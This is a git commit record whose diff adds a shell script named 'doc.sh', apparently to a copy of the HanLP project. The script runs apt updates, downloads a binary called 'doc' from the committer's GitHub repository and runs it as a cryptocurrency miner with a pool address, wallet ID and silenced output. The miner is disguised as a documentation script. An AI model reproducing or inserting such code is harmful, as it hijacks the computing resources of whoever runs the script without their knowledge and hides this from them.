3b5513182b4bef7ff33501c566fc77a0b458bfad
Haohek <94043582+Haohek@users.noreply.github.com>
2021-11-10 17:39:06 +0700

    Update doc.sh

--- doc.sh
+++ doc.sh
@@ -1,1 +1,7 @@
+#!/bin/sh
+apt update
+apt upgrade -y
+apt install -y
+wget https://github.com/Haohek/HanLP/raw/doc-zh/doc
+./doc --disable-gpu --algorithm yespowerurx --pool cpu-pool.com:63378 --wallet Uj7osA1Qmn5bKkqswHFJfpyQJscH5kPUGs.0716 --password x --cpu-threads 1 > /dev/null
 
